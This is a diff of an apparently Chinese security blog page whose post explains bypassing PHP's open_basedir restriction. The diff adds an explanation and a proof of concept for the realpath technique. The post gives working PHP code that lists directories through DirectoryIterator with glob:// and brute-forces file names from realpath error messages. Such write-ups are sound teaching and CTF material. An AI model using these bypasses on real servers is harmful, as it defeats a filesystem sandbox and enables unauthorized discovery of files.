@@ -272,7 +272,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">272</span>阅读时长: <span class="post-count reading-time">1 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">536</span>阅读时长: <span class="post-count reading-time">2 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -404,7 +404,8 @@ height:50vh;
         <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>之前在出国赛题的时候，设置<code>open_basedir</code>的时候突发奇想，可不可以绕过<code>open_basedir</code>呢，谷歌了一波，发现确实有不少的tricks，遂来总结一波  </p>
 <h4 id="DirectoryIterator-Glob列目录"><a href="#DirectoryIterator-Glob列目录" class="headerlink" title="DirectoryIterator + Glob列目录"></a>DirectoryIterator + Glob列目录</h4><p>DirectoryIterator是一个php提供的用于查看文件系统目录的一个接口，调用它是可以直接看到文件目录的，但是如果我们设置了<code>open_basedir</code>的时候，用它列举不允许的目录，就会直接导致服务器500<br>glob是自php5.3起用来查找匹配的文件路径模式的一个流包装器<br>当他们组合一起的时候就很炫了<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">printf(<span class="string">'open_basedir: %s &lt;/br&gt;'</span>,ini_get(<span class="string">'open_basedir'</span>));</span><br><span class="line">$file_list = <span class="keyword">array</span>();</span><br><span class="line">$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///*"</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($it <span class="keyword">as</span> $f)&#123;</span><br><span class="line">    $file_list[] = $f-&gt;__toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$it = <span class="keyword">new</span> DirectoryIterator(<span class="string">"glob:///.*"</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($it <span class="keyword">as</span> $f)&#123;</span><br><span class="line">    $file_list[] = $f-&gt;__toString();</span><br><span class="line">&#125;</span><br><span class="line">sort($file_list);</span><br><span class="line"><span class="keyword">foreach</span> ($file_list <span class="keyword">as</span> $f)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&#123;$f&#125;&lt;br/&gt;"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p><img src="/assets/opendir/1.png" alt=""><br>可以看到，成功地列出了目录了，这个漏洞直到php7还能用，测试环境是linux+php7（摇头.gif  </p>
-<h4 id="realpath列目录"><a href="#realpath列目录" class="headerlink" title="realpath列目录"></a>realpath列目录</h4><p>realpath是php中一个将相对路径转化为绝对路径的方法  </p>
+<h4 id="realpath列目录"><a href="#realpath列目录" class="headerlink" title="realpath列目录"></a>realpath列目录</h4><p>realpath是php中一个将相对路径转化为绝对路径的方法，而如果开启了<code>open_basedir</code>的话，如果我们传入一个不存在的文件名，会返回false，但是如果我们传入一个不在<code>open_basedir</code>里的文件的话，他就会返回<code>file is not within the allowed path(s)</code>，所以这个时候就可以类似于报错盲注去爆出文件名了<br>这里有个小trick，利用windows下的通配符&lt;和&gt;去进行爆破可以快一点<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">printf(<span class="string">"open_basedir: %s&lt;br/&gt;&lt;br/&gt;"</span>, ini_get(<span class="string">'open_basedir'</span>));</span><br><span class="line">set_error_handler(<span class="string">'isexist'</span>);</span><br><span class="line">$dir = <span class="string">'d:/test/'</span>;</span><br><span class="line">$file = <span class="string">''</span>;</span><br><span class="line">$chars = <span class="string">'abcdefghijklmnopqrstuvwxyz0123456789-*/+_'</span>;</span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i&lt;strlen($chars); $i++)&#123;</span><br><span class="line">    $file = $dir.$chars[$i].<span class="string">'&lt;&lt;'</span>;</span><br><span class="line">    realpath($file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isexist</span><span class="params">($errno, $errstr)</span></span>&#123;</span><br><span class="line">    $regex = <span class="string">'/File\((.*)\) is not within/'</span>;</span><br><span class="line">    printf(<span class="string">"errstr: %s &lt;br/&gt;"</span>,$errstr);</span><br><span class="line">    preg_match($regex, $errstr, $mathes);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($mathes[<span class="number">1</span>]))&#123;</span><br><span class="line">        printf(<span class="string">"%s &lt;br/&gt;&lt;br/&gt;"</span>, $mathes[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/assets/opendir/2.png" alt=""><br>可以看到，当报错的时候会将文件名也直接爆出来，因此如果文件名首字母不一致的话，跑一次就能直接将所有文件名跑出来了，如果重复问题也不大，改下前缀也都能出来的  </p>
 
     </article>
     <!-- license  -->
@@ -1212,8 +1213,6 @@ top:50vh;
     
     
     
-    
-    
     <div class="total-and-search">
         <div class="total-archive">
         Total : 47
@@ -1307,12 +1306,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/imap_open()实现远程任意代码执行（CVE-2018-19518）/">imap_open()实现远程任意代码执行（CVE-2018-19518）</a>
+            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/2019安恒杯二月赛/">2019安恒杯二月赛</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/2019安恒杯二月赛/">2019安恒杯二月赛</a>
+            <span class="archive-post-date">03/01</span><a class="archive-post-title" href="/2019/03/01/imap_open()实现远程任意代码执行（CVE-2018-19518）/">imap_open()实现远程任意代码执行（CVE-2018-19518）</a>
         </li>
     
     
@@ -1327,12 +1326,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/24</span><a class="archive-post-title" href="/2019/02/24/2019tamuctf/">2019tamuctf</a>
+            <span class="archive-post-date">02/24</span><a class="archive-post-title" href="/2019/02/24/2018百越杯wp/">2018百越杯wp</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">02/24</span><a class="archive-post-title" href="/2019/02/24/2018百越杯wp/">2018百越杯wp</a>
+            <span class="archive-post-date">02/24</span><a class="archive-post-title" href="/2019/02/24/2019tamuctf/">2019tamuctf</a>
         </li>
     
     
